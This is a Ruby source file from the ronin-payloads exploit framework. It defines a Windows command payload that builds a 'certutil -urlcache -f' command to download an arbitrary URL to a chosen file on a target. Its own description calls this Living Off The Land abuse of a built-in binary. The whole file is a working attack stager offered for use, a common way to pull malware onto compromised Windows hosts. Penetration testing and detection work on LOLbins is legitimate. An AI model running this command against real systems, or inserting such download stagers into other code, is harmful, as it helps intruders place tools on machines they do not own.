# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/command_payload'

module Ronin
  module Payloads
    module CMD
      module Windows
        #
        # Uses `certutil` to download a file.
        #
        # @since 0.2.0
        #
        class Download < CommandPayload

          register 'cmd/windows/download'

          summary 'Downloads a file on Windows'
          description <<~DESC
            Uses the `certutil` Windows command to download a URL and save it
            to a sepcific destination file.

            The technique of using builtin system utilities for alternative
            purposes is known as Living Off The Land (LOTL). These builtin
            system binaries, which can be used for alternative purposes, are
            known as "LOLbins".
          DESC

          param :url, String, required: true,
                              desc:    'The URL to download'

          param :dest, String, required: true,
                               desc:    'The destination file'

          #
          # Builds the `certutil` command.
          #
          def build
            @payload = "certutil -urlcache -f '#{params[:url]}' #{params[:dest]}"
          end

        end
      end
    end
  end
end
